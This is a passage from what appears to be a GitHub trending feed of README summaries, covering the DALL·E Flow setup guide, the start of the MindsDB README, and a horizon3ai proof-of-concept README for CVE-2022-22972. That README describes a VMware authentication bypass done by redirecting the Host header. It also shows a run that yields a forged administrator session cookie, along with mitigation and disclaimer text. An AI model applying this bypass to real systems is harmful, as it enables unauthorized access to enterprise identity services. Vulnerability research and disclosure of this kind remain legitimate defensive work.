Matisse&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Let&#39;s submit it to the server and visualize the results:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from docarray import Document&#xA;&#xA;da = Document(text=prompt).post(server_url, parameters={&#39;num_images&#39;: 8}).matches&#xA;&#xA;da.plot_image_sprites(fig_size=(10,10), show_index=True)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here we generate 16 candidates, 8 from DALLE-mega and 8 from GLID3 XL, this is as defined in &lt;code&gt;num_images&lt;/code&gt;, which takes about ~2 minutes. You can use a smaller value if it is too long for you.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/client-dalle.png?raw=true&#34; width=&#34;70%&#34;&gt; &lt;/p&gt; &#xA;&lt;h3&gt;Step 2: Select and refinement via GLID3 XL&lt;/h3&gt; &#xA;&lt;p&gt;The 16 candidates are sorted by &lt;a href=&#34;https://github.com/jina-ai/clip-as-service&#34;&gt;CLIP-as-service&lt;/a&gt;, with index-&lt;code&gt;0&lt;/code&gt; as the best candidate judged by CLIP. Of course, you may think differently. Notice the number in the top-left corner? Select the one you like the most and get a better view:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;fav_id = 3&#xA;fav = da[fav_id]&#xA;fav.display()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/client-select1.png?raw=true&#34; width=&#34;30%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Now let&#39;s submit the selected candidates to the server for diffusion.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;diffused = fav.post(f&#39;{server_url}&#39;, parameters={&#39;skip_rate&#39;: 0.5, &#39;num_images&#39;: 36}, target_executor=&#39;diffusion&#39;).matches&#xA;&#xA;diffused.plot_image_sprites(fig_size=(10,10), show_index=True)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will give 36 images based on the selected image. You may allow the model to improvise more by giving &lt;code&gt;skip_rate&lt;/code&gt; a near-zero value, or a near-one value to force its closeness to the given image. The whole procedure takes about ~2 minutes.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/client-glid.png?raw=true&#34; width=&#34;60%&#34;&gt; &lt;/p&gt; &#xA;&lt;h3&gt;Step 3: Select and upscale via SwinIR&lt;/h3&gt; &#xA;&lt;p&gt;Select the image you like the most, and give it a closer look:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;dfav_id = 34&#xA;fav = diffused[dfav_id]&#xA;fav.display()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/client-select2.png?raw=true&#34; width=&#34;30%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Finally, submit to the server for the last step: upscaling to 1024 x 1024px.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;fav = fav.post(f&#39;{server_url}/upscale&#39;)&#xA;fav.display()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That&#39;s it! It is &lt;em&gt;the one&lt;/em&gt;. If not satisfied, please repeat the procedure.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/client-select3.png?raw=true&#34; width=&#34;50%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Btw, DocArray is a powerful and easy-to-use data structure for unstructured data. It is super productive for data scientists who work in cross-/multi-modal domain. To learn more about DocArray, &lt;a href=&#34;https://docs.jina.ai&#34;&gt;please check out the docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Server&lt;/h2&gt; &#xA;&lt;p&gt;You can host your own server by following the instruction below.&lt;/p&gt; &#xA;&lt;h3&gt;Hardware requirements&lt;/h3&gt; &#xA;&lt;p&gt;DALL·E Flow needs one GPU with 21GB memory at its peak. All services are squeezed into this one GPU.&lt;/p&gt; &#xA;&lt;p&gt;It requires at least 40GB free space on the hard drive, mostly for downloading pretrained models.&lt;/p&gt; &#xA;&lt;p&gt;High-speed internet is required. Slow/unstable internet may throw frustrating timeout when downloading models.&lt;/p&gt; &#xA;&lt;p&gt;CPU-only environment is not tested and likely won&#39;t work. Google Colab is likely throwing OOM hence also won&#39;t work.&lt;/p&gt; &#xA;&lt;h3&gt;Server architecture&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/flow.svg?raw=true&#34; width=&#34;70%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;If you have installed Jina, the above flowchart can be generated via:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python -c &#34;from jina import Flow; Flow.load_config(&#39;flow.yml&#39;).plot(&#39;flow.svg&#39;)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Run in Docker&lt;/h3&gt; &#xA;&lt;p&gt;We have provided &lt;a href=&#34;https://github.com/jina-ai/dalle-flow/raw/main/Dockerfile&#34;&gt;a Dockerfile&lt;/a&gt; which allows you to run a server out of the box.&lt;/p&gt; &#xA;&lt;p&gt;Our Dockerfile is using CUDA 11.6 as the base image, you may want to adjust it according to your system.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/jina-ai/dalle-flow.git&#xA;cd dalle-flow&#xA;&#xA;docker build -t jinaai/dalle-flow .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The building will take 10 minutes with average internet speed, which results in a 10GB Docker image.&lt;/p&gt; &#xA;&lt;p&gt;To run it, simply do:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;docker run -p 51005:51005 -v $HOME/.cache:/root/.cache --gpus all jinaai/dalle-flow&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The first run will take ~10 minutes with average internet speed.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-v $HOME/.cache:/root/.cache&lt;/code&gt; avoids repeated model downloading on every docker run.&lt;/li&gt; &#xA; &lt;li&gt;The first part of &lt;code&gt;-p 51005:51005&lt;/code&gt; is your host public port. Make sure people can access this port if you are serving publicly. The second par of it is &lt;a href=&#34;https://github.com/jina-ai/dalle-flow/raw/e7e313522608668daeec1b7cd84afe56e5b19f1e/flow.yml#L4&#34;&gt;the port defined in flow.yml&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;You should see the screen like following once running:&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/docker-run.png?raw=true&#34; width=&#34;50%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Note that unlike running natively, running inside Docker may give less vivid progressbar, color logs, and prints. This is due to the limitations of the terminal in a Docker container. It does not affect the actual usage.&lt;/p&gt; &#xA;&lt;h3&gt;Run natively&lt;/h3&gt; &#xA;&lt;p&gt;Running natively requires some manual steps, but it is often easier to debug.&lt;/p&gt; &#xA;&lt;h4&gt;Clone repos&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir dalle &amp;amp;&amp;amp; cd dalle&#xA;git clone https://github.com/jina-ai/dalle-flow.git&#xA;git clone https://github.com/JingyunLiang/SwinIR.git&#xA;git clone https://github.com/CompVis/latent-diffusion.git&#xA;git clone https://github.com/hanxiao/glid-3-xl.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should have the following folder structure:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;dalle/&#xA; |&#xA; |-- dalle-flow/&#xA; |-- SwinIR/&#xA; |-- glid-3-xl/&#xA; |-- latent-diffusion/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Install auxiliary repos&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd latent-diffusion &amp;amp;&amp;amp; pip install -e . &amp;amp;&amp;amp; cd -&#xA;cd glid-3-xl &amp;amp;&amp;amp; pip install -e . &amp;amp;&amp;amp; cd -&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There are couple models we need to download for GLID-3-XL:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd glid-3-xl&#xA;wget https://dall-3.com/models/glid-3-xl/bert.pt&#xA;wget https://dall-3.com/models/glid-3-xl/kl-f8.pt&#xA;wget https://dall-3.com/models/glid-3-xl/finetune.pt&#xA;cd -&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Install flow&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd dalle-flow&#xA;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Start the server&lt;/h3&gt; &#xA;&lt;p&gt;Now you are under &lt;code&gt;dalle-flow/&lt;/code&gt;, run the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jina flow --uses flow.yml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should see this screen immediately:&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/server-onstart.png?raw=true&#34; width=&#34;50%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;On the first start it will take ~8 minutes for downloading the DALL·E mega model and other necessary models. The proceeding runs should only take ~1 minute to reach the success message.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/server-wait.png?raw=true&#34; width=&#34;50%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;When everything is ready, you will see:&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/jina-ai/dalle-flow/raw/main/.github/server-success.png?raw=true&#34; width=&#34;50%&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Congrats! Now you should be able to &lt;a href=&#34;https://raw.githubusercontent.com/jina-ai/dalle-flow/main/#client&#34;&gt;run the client&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can modify and extend the server flow as you like, e.g. changing the model, adding persistence, or even auto-posting to Instagram/OpenSea. With Jina and DocArray, you can easily make DALL·E Flow &lt;a href=&#34;https://github.com/jina-ai/jina&#34;&gt;cloud-native and ready for production&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;!-- start support-pitch --&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To extend DALL·E Flow you will need to get familiar with &lt;a href=&#34;https://github.com/jina-ai/jina&#34;&gt;Jina&lt;/a&gt; and &lt;a href=&#34;https://github.com/jina-ai/docarray&#34;&gt;DocArray&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Join our &lt;a href=&#34;https://slack.jina.ai&#34;&gt;Slack community&lt;/a&gt; and chat with other community members about ideas.&lt;/li&gt; &#xA; &lt;li&gt;Join our &lt;a href=&#34;https://youtube.com/playlist?list=PL3UBBWOUVhFYRUa_gpYYKBqEAkO4sxmne&#34;&gt;Engineering All Hands&lt;/a&gt; meet-up to discuss your use case and learn Jina&#39;s new features. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;strong&gt;When?&lt;/strong&gt; The second Tuesday of every month&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Where?&lt;/strong&gt; Zoom (&lt;a href=&#34;https://calendar.google.com/calendar/embed?src=c_1t5ogfp2d45v8fit981j08mcm4%40group.calendar.google.com&amp;amp;ctz=Europe%2FBerlin&#34;&gt;see our public events calendar&lt;/a&gt;/&lt;a href=&#34;https://calendar.google.com/calendar/ical/c_1t5ogfp2d45v8fit981j08mcm4%40group.calendar.google.com/public/basic.ics&#34;&gt;.ical&lt;/a&gt;) and &lt;a href=&#34;https://youtube.com/c/jina-ai&#34;&gt;live stream on YouTube&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Subscribe to the latest video tutorials on our &lt;a href=&#34;https://youtube.com/c/jina-ai&#34;&gt;YouTube channel&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Join Us&lt;/h2&gt; &#xA;&lt;p&gt;DALL·E Flow is backed by &lt;a href=&#34;https://jina.ai&#34;&gt;Jina AI&lt;/a&gt; and licensed under &lt;a href=&#34;https://raw.githubusercontent.com/jina-ai/dalle-flow/main/LICENSE&#34;&gt;Apache-2.0&lt;/a&gt;. &lt;a href=&#34;https://jobs.jina.ai&#34;&gt;We are actively hiring&lt;/a&gt; AI engineers, solution engineers to build the next neural search ecosystem in open-source.&lt;/p&gt; &#xA;&lt;!-- end support-pitch --&gt;</summary>
  </entry>
  <entry>
    <title>horizon3ai/CVE-2022-22972</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/horizon3ai/CVE-2022-22972</id>
    <link href="https://github.com/horizon3ai/CVE-2022-22972" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2022-22972&lt;/h1&gt; &#xA;&lt;p&gt;POC for CVE-2022-22972 affecting VMware Workspace ONE, vIDM, and vRealize Automation 7.6.&lt;/p&gt; &#xA;&lt;h2&gt;Technical Analysis&lt;/h2&gt; &#xA;&lt;p&gt;A technical root cause analysis of the vulnerability can be found on our blog: &lt;a href=&#34;https://www.horizon3.ai/vmware-authentication-bypass-vulnerability-cve-2022-22972-technical-deep-dive&#34;&gt;https://www.horizon3.ai/vmware-authentication-bypass-vulnerability-cve-2022-22972-technical-deep-dive&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Summary&lt;/h2&gt; &#xA;&lt;p&gt;This script can be used by bypass authentication on vRealize Automation 7.6 using CVE-2022-22972. Workspace ONE and vIDM have different authentication endpoints, but the crux of the vulnerability remains the same. We&#39;re happy to accept pull requests if you happen to have test articles to verify the flow.&lt;/p&gt; &#xA;&lt;p&gt;This script works by changing the Host header of a HTTP POST request of a VMware authentication endpoint to a Host controlled by an attacker. This causes the VMware application to reach out to the Host with credential information and if the Host returns 200, the user is successfully authenticated.&lt;/p&gt; &#xA;&lt;p&gt;This script results in a HZN cookie which can be included with later requests to perform actions as the compromised user.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: The script&#39;s default args will send the authentication request to &lt;strong&gt;our AWS API gateway&lt;/strong&gt; which is configured to reply with a 200 for the specific endpoint mentioned in the blog. You can change this with the &lt;code&gt;--host&lt;/code&gt; option. This endpoint &lt;strong&gt;will not receive any sensitive data&lt;/strong&gt; during the exploit flow - just a request from the vulnerable application with the bogus auth header which it replies to.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plaintext&#34;&gt;dev@ubuntu:~/vmware/vra/exploit$ python3 CVE-2022-22972.py https://vra-app01.vra.intranet&#xA;Extracting state from vcac redirects...&#xA;Sending POST to auth endpoint&#xA;&#xA;HZN=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJqdGkiOiJiM2E3MDJiOS01NjJkLTQwODgtYTg2Ny0xZjY5ZWE4YjAyZjMiLCJwcm4iOiJhZG1pbmlzdHJhdG9yQFZTUEhFUkUuTE9DQUwiLCJkb21haW4iOiJ2c3BoZXJlLmxvY2FsIiwidXNlcl9pZCI6IjMiLCJhdXRoX3RpbWUiOjE2NTM0MjUwOTAsImlzcyI6Imh0dHBzOi8vZWkzd3B0OTEwMC5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9TQUFTL3QvdnNwaGVyZS5sb2NhbC9hdXRoIiwiYXVkIjoiaHR0cHM6Ly9laTN3cHQ5MTAwLmV4ZWN1dGUtYXBpLnVzLWVhc3QtMi5hbWF6b25hd3MuY29tL1NBQVMvdC92c3BoZXJlLmxvY2FsL2F1dGgvb2F1dGh0b2tlbiIsImN0eCI6Ilt7XCJtdGRcIjpcInVybjp2bXdhcmU6bmFtZXM6YWM6Y2xhc3NlczpMb2NhbFBhc3N3b3JkQXV0aFwiLFwiaWF0XCI6MTY1MzQyNTA5MCxcImlkXCI6M31dIiwic2NwIjoicHJvZmlsZSBhZG1pbiB1c2VyIGVtYWlsIG9wZXJhdG9yIiwiaWRwIjoiMiIsImVtbCI6ImFkbWluaXN0cmF0b3JAdnJhLWFwcDAxLnZyYS5pbnRyYW5ldCIsImNpZCI6IiIsImRpZCI6IiIsIndpZCI6IiIsInJ1bGVzIjp7ImV4cGlyeSI6MTY1MzQyNjg5MCwicnVsZXMiOlt7InJlc291cmNlcyI6WyIqIl0sImFjdGlvbnMiOlsiKiJdLCJjb25kaXRpb25zIjpudWxsfV0sImxpbmsiOm51bGx9LCJleHAiOjE2NTM0MjY4OTAsImlhdCI6MTY1MzQyNTA5MCwic3ViIjoiYWQzODkzODEtNTRmNS00ODFkLWFmNWEtOWZjNmIzOGI0NzQ0IiwicHJuX3R5cGUiOiJVU0VSIn0.Kkq2UnmqpW6yJb3GGCp7dSXc5PlU1y8YyDULIYLHIvYlB3OC4j5xFDy91a2tk4bi1lAUITymV-NUgweoCl15LXFVfBFYLEs-OAvMLKZhhGnFF-BrxmyYLPJutkxsi-gL0rF4VmYykuYw9tdUY2DghWiGGZ6QTYOts21QUzcvU-8&#xA;&#xA;Set the HZN cookie in your browser to bypass authentication&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Mitigations&lt;/h2&gt; &#xA;&lt;p&gt;Update to the latest version or mitigate by following the instructions within the VMSA&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.vmware.com/security/advisories/VMSA-2022-0014.html&#34;&gt;https://www.vmware.com/security/advisories/VMSA-2022-0014.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Follow the Horizon3.ai Attack Team on Twitter for the latest security research:&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/Horizon3Attack&#34;&gt;Horizon3 Attack Team&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/JamesHorseman2&#34;&gt;James Horseman&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/hacks_zach&#34;&gt;Zach Hanley&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>mindsdb/mindsdb</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/mindsdb/mindsdb</id>
    <link href="https://github.com/mindsdb/mindsdb" rel="alternate"></link>
    <summary type="html">&lt;p&gt;In-Database Machine Learning&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; &lt;img width=&#34;300&#34; src=&#34;https://github.com/mindsdb/mindsdb_native/raw/stable/assets/MindsDBColorPurp@3x.png?raw=true&#34; alt=&#34;MindsDB&#34;&gt; &lt;br&gt; &lt;/h1&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://github.com/mindsdb/mindsdb/actions&#34;&gt;&lt;img src=&#34;https://github.com/mindsdb/mindsdb/workflows/MindsDB%20workflow/badge.svg?sanitize=true&#34; alt=&#34;MindsDB workflow&#34;&gt;&lt;/a&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://www.python.org/downloads/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/python-3.6%20|%203.7|%203.8-brightgreen.svg&#34; alt=&#34;Python supported&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/MindsDB/&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://badge.fury.io/py/MindsDB.svg?sanitize=true&#34; alt=&#34;PyPi Version&#34;&gt;&lt;/a&gt; &lt;img alt=&#34;PyPI - Downloads&#34; src=&#34;https://img.shields.io/pypi/dm/Mindsdb&#34;&gt; &lt;a href=&#34;https://hub.docker.com/u/mindsdb&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/mindsdb/mindsdb&#34; alt=&#34;Docker pulls&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/website?url=https%3A%2F%2Fwww.mindsdb.com%2F&#34; alt=&#34;MindsDB Website&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://join.slack.com/t/mindsdbcommunity/shared_invite/zt-o8mrmx3l-5ai~5H66s6wlxFfBMVI6wQ&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/slack-@mindsdbcommunity-brightgreen.svg?logo=slack &#34; alt=&#34;MindsDB Community&#34;&gt;&lt;/a&gt; &lt;br&gt; &lt;a href=&#34;https://deepnote.com/project/Machine-Learning-With-SQL-8GDF7bc7SzKlhBLorqoIcw/%2Fmindsdb_demo.ipynb&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://deepnote.com/buttons/launch-in-deepnote-white.svg?sanitize=true&#34; alt=&#34;Launch in Deepnote&#34;&gt;&lt;/a&gt; &lt;br&gt;&lt;/p&gt; &#xA; &lt;h3 align=&#34;center&#34;&gt; &lt;a href=&#34;https://www.mindsdb.com?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;Website&lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://docs.mindsdb.com?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;Docs&lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://join.slack.com/t/mindsdbcommunity/shared_invite/zt-o8mrmx3l-5ai~5H66s6wlxFfBMVI6wQ&#34;&gt;Community Slack&lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://github.com/mindsdb/mindsdb/projects&#34;&gt;Contribute&lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://cloud.mindsdb.com&#34;&gt;Demo&lt;/a&gt; &lt;/h3&gt; &#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://mindsdb.com?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;MindsDB&lt;/a&gt; ML-SQL Server enables machine learning workflows for the most powerful databases and datawarehouses using SQL. &lt;a href=&#34;https://twitter.com/intent/tweet?text=Machine%20Learning%20inside%20Databases%20&amp;amp;url=https://www.mindsdb.com&amp;amp;via=mindsdb&amp;amp;hashtags=ai,ml,machine_learning,neural_networks,databases,sql&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/url/http/shields.io.svg?style=social&#34; alt=&#34;Tweet&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Developers can quickly add AI capabilities to your applications.&lt;/li&gt; &#xA; &lt;li&gt;Data Scientists can streamline MLOps by deploying ML models as AI Tables.&lt;/li&gt; &#xA; &lt;li&gt;Data Analysts can easily make forecasts on complex data (like multivariate time-series with high cardinality) and visualize them in BI tools like Tableau.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you like our project then we would really appreciate &lt;strong&gt;a Star ⭐!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Also, check-out the &lt;a href=&#34;https://mindsdb.com/community?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;rewards and community programs.&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/mindsdb/mindsdb#installation&#34;&gt;Installation&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#overview&#34;&gt;Overview&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#features&#34;&gt;Features&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#database-integrations&#34;&gt;Database Integrations&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#quickstart&#34;&gt;Quickstart&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#documentation&#34;&gt;Documentation&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#support&#34;&gt;Support&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#contribution&#34;&gt;Contributing&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#mailing-lists&#34;&gt;Mailing lists&lt;/a&gt; - &lt;a href=&#34;https://github.com/mindsdb/mindsdb#license&#34;&gt;License&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2 align=&#34;center&#34;&gt; Machine Learning using SQL &lt;br&gt; &lt;br&gt; &lt;img width=&#34;600&#34; src=&#34;https://docs.mindsdb.com/assets/mdb_image.png&#34; alt=&#34;MindsDB&#34;&gt; &lt;/h2&gt; &#xA;&lt;h2&gt;Demo&lt;/h2&gt; &#xA;&lt;p&gt;You can try Mindsdb ML SQL server here &lt;a href=&#34;https://cloud.mindsdb.com&#34;&gt;(demo)&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;To install the latest version of MindsDB please pull the following Docker image:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker pull mindsdb/mindsdb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or, use PyPI:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip install mindsdb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;MindsDB automates and abstracts machine learning models through virtual AI Tables:&lt;/p&gt; &#xA;&lt;p&gt;Apart from abstracting ML models as AI Tables inside databases, MindsDB has a set of unique capabilities as:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Easily make predictions over very complex multivariate time-series data with high cardinality&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;An open JSON-AI syntax to tune ML models and optimize ML pipelines in a declarative way&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;How it works:&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Let MindsDB connect to your database.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Train a Predictor using a single SQL statement (make MindsDB learn from historical data automatically) or import your own ML model to a Predictor via JSON-AI .&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Make predictions with SQL statements (Predictor is exposed as virtual AI Tables). There’s no need to deploy models since they are already part of the data layer.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Check our &lt;a href=&#34;https://docs.mindsdb.com/?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;docs&lt;/a&gt; and &lt;a href=&#34;https://mindsdb.com/blog/?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;blog&lt;/a&gt; for tutorials and use case examples.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Automatic data pre-processing, feature engineering and encoding&lt;/li&gt; &#xA; &lt;li&gt;Classification, regression, time-series tasks&lt;/li&gt; &#xA; &lt;li&gt;Bring models to production without “traditional deployment” as AI Tables&lt;/li&gt; &#xA; &lt;li&gt;Get mModels’ accuracy scoring and confidence intervals for each prediction&lt;/li&gt; &#xA; &lt;li&gt;Join ML models with existing data&lt;/li&gt; &#xA; &lt;li&gt;Anomaly detection&lt;/li&gt; &#xA; &lt;li&gt;Model explainability analysis&lt;/li&gt; &#xA; &lt;li&gt;GPU support for models’ training&lt;/li&gt; &#xA; &lt;li&gt;Open JSON-AI syntax to build models and bring your own ML blocks in a declarative way&lt;/li&gt; 